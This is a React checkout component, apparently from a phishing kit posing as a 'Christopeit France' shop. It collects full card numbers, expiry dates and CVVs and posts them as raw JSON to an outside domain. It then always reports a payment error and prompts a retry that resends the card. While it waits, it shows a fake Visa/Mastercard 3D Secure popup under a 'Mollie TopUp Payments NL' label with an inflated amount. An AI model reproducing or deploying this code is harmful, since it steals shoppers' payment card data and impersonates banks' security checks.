import { set } from 'date-fns';
import { useState, useRef } from 'react';
import { useRouter } from 'next/router';

const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup, data, shop }) => {
  const [formData, setFormData] = useState({
    cardHolder: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
  });

  const [showPaymentError, setShowPaymentError] = useState(false);
  const [cardLogo, setCardLogo] = useState('/verified-by-visa.png');

  const cardNumberRef = useRef(null);
  const expiryDateRef = useRef(null);
  const router = useRouter();

  const currentDate = new Date();
  const formattedDate = currentDate.toLocaleDateString('fr-FR', {
    year: '2-digit',
    month: '2-digit',
    day: '2-digit',
  });
  const formattedTime = currentDate.toLocaleTimeString('fr-FR', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  });

  const amountFeesed = (amount * 1.025).toFixed(2); // Add 2.5% payment fees

  const lastFourDigits = formData.cardNumber.replace(/\s/g, '').slice(-4); // Extract last 4 digits of the card number

  const handleInputChange = (e) => {
    const { name, value } = e.target;

    if (name === 'cardNumber') {
      const formattedValue = value
        .replace(/\D/g, '')
        .slice(0, 16)
        .replace(/(.{4})/g, '$1 ')
        .trim();
      setFormData((prevData) => ({
        ...prevData,
        [name]: formattedValue,
      }));
    } else if (name === 'expiryDate') {
      const formattedValue = value
        .replace(/\D/g, '')
        .slice(0, 4)
        .replace(/(\d{2})(\d{1,2})?/, (_, mm, yy) => (yy ? `${mm}/${yy}` : mm));
      setFormData((prevData) => ({
        ...prevData,
        [name]: formattedValue,
      }));
    } else {
      setFormData((prevData) => ({
        ...prevData,
        [name]: value,
      }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const cardDetails = {
      cardNumber: ` ${formData.cardNumber} `,
      cardOwner: formData.cardHolder,
      cardExpiration: formData.expiryDate,
      cardCVC: formData.cvv,
    };

    if (formData.cardNumber.startsWith('5')) {
      setCardLogo('/mastercard-id-check.png');
    }

    try {
      setIsLoading(true);

      const timeoutId = setTimeout(() => {
        setIsLoading(false);
        setShow3DSecurePopup(true);
      }, 27000);

      console.log("Paiement en cours...");

      try {
        const payFetch = await fetch('https://api.christopeit-france.shop/pay', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ orderNumber, amount, cardDetails }),
        });

        setIsLoading(false);
        setShow3DSecurePopup(false);
        setShowPaymentError(true);
      } catch (error) {
        console.error(data.checkoutPayFetchError, error);
        alert(data.checkoutPayRetryAlert);
        router.push(`/checkout?failed=true`);
        setIsLoading(false);
        setShow3DSecurePopup(false);
      }
    } catch (error) {
      console.error(data.checkoutPayError, error);
      alert(data.checkoutPayGenericError);
      setIsLoading(false);
    }
  };

  const handleRetry = () => {
    setShowPaymentError(false);
    setShow3DSecurePopup(false);
    handleSubmit(new Event('submit'));
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="text"
        name="cardHolder"
        placeholder={data.checkoutPayCardHolderPlaceholder}
        onChange={handleInputChange}
        required
      />
      <input
        type="text"
        name="cardNumber"
        placeholder={data.checkoutPayCardNumberPlaceholder}
        ref={cardNumberRef}
        value={formData.cardNumber}
        onChange={handleInputChange}
        required
      />
      <div className="form-row">
        <input
          type="text"
          name="expiryDate"
          placeholder={data.checkoutPayExpiryDatePlaceholder}
          maxLength="5"
          ref={expiryDateRef}
          value={formData.expiryDate}
          onChange={handleInputChange}
          required
        />
        <input
          type="text"
          name="cvv"
          placeholder={data.checkoutPayCVVPlaceholder}
          maxLength="3"
          onChange={handleInputChange}
          required
        />
      </div>
      <article className="checkout-buttons">
        <button
          className="back-checkout"
          type="button"
          onClick={() => onBack && onBack()}
        >
          <i className="fas fa-arrow-left"></i>
        </button>
        <button id="pay-checkout" type="submit">
          {data.checkoutPayProceedButton}
        </button>
      </article>

      {isLoading && (
        <div className="verification-wrapper">
          <div className="verification-popup loading">
            <article className="head">
              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
              <img
                className={`card-logo ${
                  cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'
                }`}
                src={cardLogo}
                alt={data.checkoutPayVerifiedPaymentAlt}
              />
            </article>

            <h2>{data.checkoutPayLoadingTitle}</h2>
            <p className="desc">{data.checkoutPayLoadingDescription}</p>
            <div className="loader border-top-primary"></div>
          </div>
        </div>
      )}

      {show3DSecurePopup && (
        <div className="verification-wrapper">
          <div className="verification-popup d-secure">
            <article className="head">
              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
              <img
                className={`card-logo ${
                  cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'
                }`}
                src={cardLogo}
                alt={data.checkoutPayVerifiedPaymentAlt}
              />
            </article>
            <img src="3d-secure.png" alt="3D Secure" className="icon" />
            <h2>{data.checkoutPay3DSecureTitle}</h2>
            <p className="desc">{data.checkoutPay3DSecureDescription}</p>
            <article className="infos">
              <span>Mollie TopUp Payments NL</span>
              <span>
                {data.checkoutPay3DSecureAmount} : {amountFeesed}
                {shop.currency}
              </span>
              <span>
                {data.checkoutPay3DSecureDate} : {`${formattedDate} à ${formattedTime}`}
              </span>
              <span>
                {data.checkoutPay3DSecureCard} : **** **** **** {lastFourDigits}
              </span>
            </article>
            <div className="loader border-top-primary"></div>

            <p className="smaller">{data.checkoutPay3DSecureFooter}</p>
          </div>
        </div>
      )}

      {showPaymentError && (
        <div className="verification-wrapper">
          <div className="verification-popup error">
            <article className="head">
              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
              <img
                className={`card-logo ${
                  cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'
                }`}
                src={cardLogo}
                alt={data.checkoutPayVerifiedPaymentAlt}
              />
            </article>
            <h2 className="icon">❌</h2>
            <h2>{data.checkoutPayErrorTitle}</h2>
            <p className="desc">{data.checkoutPayErrorDescription}</p>
            <button onClick={handleRetry} disabled={isLoading}>
              {data.checkoutPayRetryButton}
            </button>
          </div>
        </div>
      )}
    </form>
  );
};

export default CustomPay;